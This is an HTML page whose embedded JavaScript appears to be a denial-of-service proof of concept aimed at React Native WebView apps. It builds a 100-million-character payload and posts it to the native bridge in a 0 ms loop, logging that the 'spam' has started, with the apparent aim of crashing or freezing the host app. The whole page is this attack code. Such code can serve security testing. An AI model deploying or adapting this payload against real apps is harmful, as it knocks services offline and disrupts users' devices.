<!DOCTYPE html>
<html>
<body>
<pre id="log"></pre>
<script>
const log = msg => document.getElementById("log").textContent += "\n" + msg;

function post(msg) {
    try {
        if (window.ReactNativeWebView) {
            window.ReactNativeWebView.postMessage(msg);
        } else {
            log("ReactNativeWebView handler not available.");
        }
    } catch (e) {
        log("Error: " + e.message);
    }
}

// Buat payload besar tapi masih realistis
const payload = "A".repeat(100_000_000); // 100 juta karakter

if (window.ReactNativeWebView) {
    log("ReactNativeWebView handler detected (Android).");
    log("ðŸš¨ Starting 0ms spam!");
    
    setInterval(() => {
        post(payload);
    }, 0); // kirim secepat mungkin
} else {
    log("ReactNativeWebView handler not available.");
}
</script>
</body>
</html>
